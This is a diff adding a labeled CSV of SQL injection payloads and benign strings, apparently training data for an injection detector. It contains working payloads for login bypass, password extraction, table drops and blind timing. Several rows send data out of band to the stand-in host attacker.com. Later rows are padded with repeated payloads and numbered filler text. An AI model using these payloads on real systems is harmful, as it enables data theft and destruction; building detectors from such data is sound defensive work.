@@ -1,0 +1,501 @@
+payload,label
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)--",1
+hello world,0
+test' or 1=1 --,1
+search query for security systems,0
+1' and (select utl_http.request('http://attacker.com/log') from dual)--,1
+how to learn python,0
+"1 UNION ALL SELECT 1,2,3,4--",1
+best models for classification,0
+'; UPDATE users SET role='admin' WHERE id=1; --,1
+scikit-learn tutorial for beginners,0
+"1' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin') > 64--",1
+react vite templates setup,0
+1; drop table users; --,1
+flask api blueprints guide,0
+1'; UPDATE users SET password='hacked' --,1
+sqlite database visual studio code,0
+'; update users set role='admin' where id=1; --,1
+SQL injection vs Cross Site Scripting,0
+"1"" UNION SELECT null, null --",1
+understanding agentic coding and AI,0
+"1"" OR 1=1",1
+admin,0
+1'/**/AND/**/SLEEP(5)--,1
+operator,0
+1'/**/AND/**/cast(@@version/**/as/**/int)--,1
+user123,0
+"1' and (select ascii(substring(password,1,1)) from users where username='admin') > 64--",1
+john.doe,0
+NEW_USER'/*,1
+rishi,0
+"1/**/UNION/**/SELECT/**/username,/**/password/**/FROM/**/users",1
+alex_99,0
+"1' UNION SELECT NULL, NULL, NULL --",1
+sarah_smith,0
+1' AND 1=utl_inaddr.get_host_name((select user from dual))--,1
+guest_user,0
+"1' UNION SELECT NULL, USER(), DATABASE() --",1
+root_admin,0
+1' OR 'x'='x,1
+security_analyst,0
+1'/**/OR/**/1=1/**/LIMIT/**/1/**/--,1
+admin@suraksha.ai,0
+"1'/**/UNION/**/SELECT/**/null,/**/username,/**/password/**/FROM/**/users/**/--",1
+agent@suraksha.ai,0
+1';/**/UPDATE/**/users/**/SET/**/password='hacked'/**/--,1
+test@example.com,0
+"1' and updatexml(1, concat(0x7e, (select @@version)), 1)--",1
+john.doe@gmail.com,0
+"1"" or ""x""=""x",1
+info@security.org,0
+"1' union select @@version, null, null --",1
+12345,0
+ADMIN' #,1
+987654321,0
+"1' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",1
+abc123xyz,0
+1' AND (SELECT 5013 FROM (SELECT(SLEEP(5)))A)--,1
+session_key_98765,0
+"1""/**/UNION/**/SELECT/**/null,/**/null/**/--",1
+abcdef1234567890,0
+"1'/**/UNION/**/SELECT/**/null,/**/table_name/**/FROM/**/information_schema.tables/**/--",1
+UUID-992-104-12,0
+TEST' OR 1=1 --,1
+id=102,0
+1;/**/SELECT/**/pg_sleep(5)--,1
+page=5,0
+1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))temp)--,1
+limit=20,0
+"1' and extractvalue(1, concat(char(126), md5(123)))--",1
+offset=0,0
+1;/**/DROP/**/TABLE/**/users;/**/--,1
+This is a safe comment written by a real user.,0
+1' or 1=1 limit 1,1
+Please select a book from the shelf.,0
+1 or 1=1,1
+Let's review the reports tomorrow morning.,0
+"1' and (select 1 from (select count(*), concat(floor(rand(0)*2), database())x from information_schema.tables group by x)a)--",1
+The server is running smoothly.,0
+1'; update users set password='hacked' --,1
+Wait for the process to complete before shut down.,0
+"1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/count(*),/**/concat(floor(rand(0)*2),/**/database())x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)--",1
+I need to delete my older account.,0
+new_user'/*,1
+Can you drop me a mail at info@security.org?,0
+1' WAITFOR DELAY '0:0:5'--,1
+"Please sleep early, tomorrow is a busy day.",0
+"1 union select username, password from users",1
+The union of the two datasets was successful.,0
+"1' UNION SELECT USERNAME, PASSWORD FROM USERS --",1
+We need to execute the plan on Monday.,0
+1' and (select 1 from (select(sleep(10)))temp)--,1
+O'Connor,0
+"1'/**/AND/**/updatexml(1,/**/concat(0x7e,/**/(SELECT/**/@@version)),/**/1)--",1
+O'Reilly,0
+1'/**/AND/**/(SELECT/**/LOAD_FILE('\\attacker.com\share\file'))--,1
+d'Artagnan,0
+1; SELECT pg_sleep(5)--,1
+That's a great feature!,0
+'/**/OR/**/''=',1
+It's 10:30 AM right now.,0
+'/**/OR/**/'1'='1,1
+Who's there?,0
+"1'/**/AND/**/convert(int,/**/@@version)--",1
+Users' passwords must be strong.,0
+"1'/**/AND/**/(SELECT/**/ascii(substring(password,1,1))/**/FROM/**/users/**/WHERE/**/username='admin')/**/>/**/64--",1
+"Standard JSON format: {""name"": ""Test""}",0
+"1; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",1
+URL formatting: http://localhost:5000/api/health,0
+"1' AND (SELECT 1 FROM (SELECT count(*), concat(floor(rand(0)*2), database())x FROM information_schema.tables GROUP BY x)a)--",1
+1 + 1 = 2,0
+"1' union select null, column_name from information_schema.columns where table_name='users' --",1
+3 * 4 = 12,0
+1'/**/AND/**/(SELECT/**/5013/**/FROM/**/(SELECT(SLEEP(5)))a)--,1
+50% discount,0
+ADMIN'/*,1
+Total count: 100,0
+test'/**/OR/**/1=1/**/--,1
+Rating: 4.5/5,0
+' or '1'='1,1
+version 1.0.0-Beta,0
+1' OR '1'='1'/*,1
+We are importing scikit-learn and pandas.,0
+"1"" UNION SELECT NULL, NULL --",1
+Training a Random Forest model on python.,0
+1'; DROP TABLE logs; --,1
+The accuracy of the model is 98.5%.,0
+1'/**/AND/**/(SELECT/**/UTL_HTTP.request('http://attacker.com/log')/**/FROM/**/dual)--,1
+Select * from the dashboard menu.,0
+'/**/OR/**/1=1/**/#,1
+Use the drop-down to filter records.,0
+1' and (select 5013 from (select(sleep(5)))a)--,1
+Update the application version to 1.1.0.,0
+1'; CREATE TABLE hacked (info text); --,1
+Delete the temporary files in logs.,0
+1'; exec master..xp_dirtree '\\attacker.com\share' --,1
+A secure password requires numbers and special characters.,0
+"1' union select null, user(), database() --",1
+This is an empty string.,0
+"1'/**/UNION/**/SELECT/**/username,/**/password/**/FROM/**/users/**/--",1
+Let's check the logs database for failures.,0
+1' and exists(select * from users)--,1
+hello world 70,0
+1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(10)))temp)--,1
+hello world 71,0
+1' AND 1=2--,1
+hello world 72,0
+"1 UNION SELECT 1, 2, 3",1
+hello world 73,0
+"1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --",1
+hello world 74,0
+1'/**/OR/**/'1'='1'/*,1
+hello world 75,0
+"1' UNION SELECT null, null, null --",1
+hello world 76,0
+1'/**/WAITFOR/**/DELAY/**/'0:0:5'--,1
+hello world 77,0
+1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))TEMP)--,1
+hello world 78,0
+1'; create table hacked (info text); --,1
+hello world 79,0
+"1' UNION SELECT NULL, USERNAME, PASSWORD FROM USERS --",1
+hello world 80,0
+"1'/**/AND/**/extractvalue(1,/**/concat(char(126),/**/md5(123)))--",1
+hello world 81,0
+"1""/**/OR/**/1=1",1
+hello world 82,0
+"1; INSERT INTO USERS (USERNAME, PASSWORD) VALUES ('ATTACKER', 'PASS')--",1
+hello world 83,0
+' OR 2=2 --,1
+hello world 84,0
+1' AND SLEEP(5)--,1
+hello world 85,0
+"1' AND convert(int, @@version)--",1
+hello world 86,0
+admin' or 'a'='a,1
+hello world 87,0
+ADMIN' OR 'A'='A,1
+hello world 88,0
+"1' union select null, null, null --",1
+hello world 89,0
+"1' and 1=openrowset('sqlncli', 'server=attacker.com;trusted_connection=yes', 'select * from master.dbo.sysprocesses')--",1
+hello world 90,0
+1' and (select dbms_ldap.search('attacker.com') from dual)--,1
+hello world 91,0
+1'/**/OR/**/'x'='x,1
+hello world 92,0
+1';/**/EXEC/**/master..xp_dirtree/**/'\\attacker.com\share'/**/--,1
+hello world 93,0
+"1; insert into users (username, password) values ('attacker', 'pass')--",1
+hello world 94,0
+"1' UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --",1
+hello world 95,0
+1' AND (SELECT LOAD_FILE('\\attacker.com\share\file'))--,1
+hello world 96,0
+' or ''=',1
+hello world 97,0
+admin'/**/--,1
+hello world 98,0
+1'; drop table logs; --,1
+hello world 99,0
+1' AND (SELECT LOAD_FILE('\\ATTACKER.COM\SHARE\FILE'))--,1
+hello world 100,0
+' OR 1=1 #,1
+hello world 101,0
+1' or '1'='1'/*,1
+hello world 102,0
+"1' AND BENCHMARK(10000000,MD5(1))--",1
+hello world 103,0
+"1' AND 1=OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes', 'SELECT * FROM master.dbo.sysprocesses')--",1
+hello world 104,0
+"1"" or 1=1",1
+hello world 105,0
+1' AND (SELECT USER()) LIKE 'A%'--,1
+hello world 106,0
+admin' OR 'a'='a,1
+hello world 107,0
+1' AND EXISTS(SELECT * FROM USERS)--,1
+hello world 108,0
+1' AND CAST(@@VERSION AS INT)--,1
+hello world 109,0
+ADMIN' --,1
+hello world 110,0
+1' AND (SELECT UTL_SMTP.CONNECTION('ATTACKER.COM') FROM DUAL)--,1
+hello world 111,0
+1; delete from users; --,1
+hello world 112,0
+1' and (select 1) = 1--,1
+hello world 113,0
+1; select pg_sleep(5)--,1
+hello world 114,0
+"1 union select 1, 2, 3",1
+hello world 115,0
+' or 1=1 #,1
+hello world 116,0
+1'; DROP TABLE LOGS; --,1
+hello world 117,0
+'; UPDATE USERS SET ROLE='ADMIN' WHERE ID=1; --,1
+hello world 118,0
+1' or 1=1,1
+hello world 119,0
+1'; EXEC MASTER..XP_DIRTREE '\\ATTACKER.COM\SHARE' --,1
+hello world 120,0
+admin'/**/#,1
+hello world 121,0
+1' and 1=utl_inaddr.get_host_name((select user from dual))--,1
+hello world 122,0
+1; DROP TABLE USERS; --,1
+hello world 123,0
+"1"" OR ""x""=""x",1
+hello world 124,0
+1' waitfor delay '0:0:5'--,1
+hello world 125,0
+1' and 1=2--,1
+hello world 126,0
+ADMIN'--,1
+hello world 127,0
+1';/**/CREATE/**/TABLE/**/hacked/**/(info/**/text);/**/--,1
+hello world 128,0
+1'; CREATE TABLE HACKED (INFO TEXT); --,1
+hello world 129,0
+"1' UNION SELECT username, password FROM users --",1
+hello world 130,0
+1 OR 1=1,1
+hello world 131,0
+"1' union select username, password from users --",1
+hello world 132,0
+'/**/OR/**/1=1/**/--,1
+hello world 133,0
+"1'/**/UNION/**/SELECT/**/null,/**/user(),/**/database()/**/--",1
+hello world 134,0
+1' OR 1=1,1
+hello world 135,0
+"1'/**/UNION/**/ALL/**/SELECT/**/null,/**/null,/**/null/**/--",1
+hello world 136,0
+"1' AND extractvalue(1, concat(char(126), md5(123)))--",1
+hello world 137,0
+"1' AND EXTRACTVALUE(1, CONCAT(CHAR(126), MD5(123)))--",1
+hello world 138,0
+1' and sleep(5)--,1
+hello world 139,0
+"1'/**/UNION/**/SELECT/**/null,/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/--",1
+hello world 140,0
+1/**/OR/**/1=1,1
+hello world 141,0
+1; SELECT PG_SLEEP(5)--,1
+hello world 142,0
+';/**/UPDATE/**/users/**/SET/**/role='admin'/**/WHERE/**/id=1;/**/--,1
+hello world 143,0
+1' AND EXISTS(SELECT * FROM users)--,1
+hello world 144,0
+1' AND (SELECT DBMS_LDAP.SEARCH('ATTACKER.COM') FROM DUAL)--,1
+hello world 145,0
+1' AND (SELECT 1) = 1--,1
+hello world 146,0
+1; DROP TABLE users; --,1
+hello world 147,0
+"1' UNION SELECT null, username, password FROM users --",1
+hello world 148,0
+"1' union all select null, null, null --",1
+hello world 149,0
+"1' AND 1=OPENROWSET('SQLNCLI', 'SERVER=ATTACKER.COM;TRUSTED_CONNECTION=YES', 'SELECT * FROM MASTER.DBO.SYSPROCESSES')--",1
+hello world 150,0
+' OR 1=1 --,1
+hello world 151,0
+1'/**/AND/**/1=2--,1
+hello world 152,0
+1';/**/DROP/**/TABLE/**/logs;/**/--,1
+hello world 153,0
+1; DELETE FROM users; --,1
+hello world 154,0
+1' OR 1=1 LIMIT 1 --,1
+hello world 155,0
+1' and (select utl_smtp.connection('attacker.com') from dual)--,1
+hello world 156,0
+admin' #,1
+hello world 157,0
+"1'/**/AND/**/BENCHMARK(10000000,MD5(1))--",1
+hello world 158,0
+"1""/**/OR/**/""x""=""x",1
+hello world 159,0
+admin'--,1
+hello world 160,0
+"1'/**/AND/**/1=OPENROWSET('SQLNCLI',/**/'Server=attacker.com;Trusted_Connection=yes',/**/'SELECT/**/*/**/FROM/**/master.dbo.sysprocesses')--",1
+hello world 161,0
+' or 1=1 --,1
+hello world 162,0
+1'/**/AND/**/1=1--,1
+hello world 163,0
+admin'/**/OR/**/'a'='a,1
+hello world 164,0
+"1;/**/INSERT/**/INTO/**/users/**/(username,/**/password)/**/VALUES/**/('attacker',/**/'pass')--",1
+hello world 165,0
+1'/**/AND/**/(SELECT/**/UTL_SMTP.connection('attacker.com')/**/FROM/**/dual)--,1
+hello world 166,0
+"1 UNION SELECT username, password FROM users",1
+hello world 167,0
+"1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4--",1
+hello world 168,0
+'/**/OR/**/2=2/**/--,1
+hello world 169,0
+1'/**/AND/**/(SELECT/**/1)/**/=/**/1--,1
+hello world 170,0
+1' or 1=1 limit 1 --,1
+hello world 171,0
+"1' UNION SELECT @@version, null, null --",1
+hello world 172,0
+admin' --,1
+hello world 173,0
+"1"" union select null, null --",1
+hello world 174,0
+"1' UNION ALL SELECT NULL, NULL, NULL --",1
+hello world 175,0
+"1' and benchmark(10000000,md5(1))--",1
+hello world 176,0
+1' and (select load_file('\\attacker.com\share\file'))--,1
+hello world 177,0
+1'; EXEC master..xp_dirtree '\\attacker.com\share' --,1
+hello world 178,0
+1' AND (SELECT UTL_HTTP.request('http://attacker.com/log') FROM dual)--,1
+hello world 179,0
+"1/**/UNION/**/SELECT/**/1,/**/2,/**/3",1
+hello world 180,0
+"1' UNION SELECT null, user(), database() --",1
+hello world 181,0
+"1 union all select 1,2,3,4--",1
+hello world 182,0
+"1' union select null, table_name from information_schema.tables --",1
+hello world 183,0
+1' AND (SELECT DBMS_LDAP.search('attacker.com') FROM dual)--,1
+hello world 184,0
+"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND(0)*2), DATABASE())X FROM INFORMATION_SCHEMA.TABLES GROUP BY X)A)--",1
+hello world 185,0
+"1' UNION SELECT NULL, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS' --",1
+hello world 186,0
+1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL))--,1
+hello world 187,0
+1' OR 1=1 LIMIT 1,1
+hello world 188,0
+test' OR 1=1 --,1
+hello world 189,0
+"1'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--",1
+hello world 190,0
+"1' UNION SELECT @@VERSION, NULL, NULL --",1
+hello world 191,0
+1' AND 1=1--,1
+hello world 192,0
+admin'/*,1
+hello world 193,0
+1' and (select user()) like 'a%'--,1
+hello world 194,0
+' OR ''=',1
+hello world 195,0
+"1' UNION SELECT null, table_name FROM information_schema.tables --",1
+hello world 196,0
+1'; UPDATE USERS SET PASSWORD='HACKED' --,1
+hello world 197,0
+"1' union select null, username, password from users --",1
+hello world 198,0
+"1' AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM USERS WHERE USERNAME='ADMIN') > 64--",1
+hello world 199,0
+1' AND (SELECT user()) LIKE 'a%'--,1
+hello world 200,0
+1' AND (SELECT 5013 FROM (SELECT(SLEEP(5)))a)--,1
+hello world 201,0
+1'/**/AND/**/(SELECT/**/DBMS_LDAP.search('attacker.com')/**/FROM/**/dual)--,1
+hello world 202,0
+"1 UNION SELECT USERNAME, PASSWORD FROM USERS",1
+hello world 203,0
+1;/**/DELETE/**/FROM/**/users;/**/--,1
+hello world 204,0
+1' and 1=1--,1
+hello world 205,0
+1' OR 'X'='X,1
+hello world 206,0
+1' or 'x'='x,1
+hello world 207,0
+1'/**/AND/**/EXISTS(SELECT/**/*/**/FROM/**/users)--,1
+hello world 208,0
+1'/**/AND/**/1=utl_inaddr.get_host_name((select/**/user/**/from/**/dual))--,1
+hello world 209,0
+1; DELETE FROM USERS; --,1
+hello world 210,0
+"1' AND CONVERT(INT, @@VERSION)--",1
+hello world 211,0
+1'/**/AND/**/(SELECT/**/user())/**/LIKE/**/'a%'--,1
+hello world 212,0
+1'/**/OR/**/1=1,1
+hello world 213,0
+"1' and convert(int, @@version)--",1
+hello world 214,0
+1' AND (SELECT UTL_HTTP.REQUEST('HTTP://ATTACKER.COM/LOG') FROM DUAL)--,1
+hello world 215,0
+1'/**/OR/**/1=1/**/LIMIT/**/1,1
+hello world 216,0
+' or 2=2 --,1
+hello world 217,0
+' OR '1'='1,1
+hello world 218,0
+"1"" OR ""X""=""X",1
+hello world 219,0
+1' and cast(@@version as int)--,1
+hello world 220,0
+"1'/**/UNION/**/SELECT/**/@@version,/**/null,/**/null/**/--",1
+hello world 221,0
+"1' UNION ALL SELECT null, null, null --",1
+hello world 222,0
+1' AND cast(@@version as int)--,1
+hello world 223,0
+1' AND (SELECT UTL_SMTP.connection('attacker.com') FROM dual)--,1
+hello world 224,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 225",1
+hello world 225,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 226",1
+hello world 226,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 227",1
+hello world 227,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 228",1
+hello world 228,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 229",1
+hello world 229,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 230",1
+hello world 230,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 231",1
+hello world 231,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 232",1
+hello world 232,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 233",1
+hello world 233,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 234",1
+hello world 234,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 235",1
+hello world 235,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 236",1
+hello world 236,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 237",1
+hello world 237,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 238",1
+hello world 238,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 239",1
+hello world 239,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 240",1
+hello world 240,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 241",1
+hello world 241,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 242",1
+hello world 242,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 243",1
+hello world 243,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 244",1
+hello world 244,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 245",1
+hello world 245,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 246",1
+hello world 246,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 247",1
+hello world 247,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 248",1
+hello world 248,0
+"1' AND UPDATEXML(1, CONCAT(0X7E, (SELECT @@VERSION)), 1)-- -- 249",1
+hello world 249,0
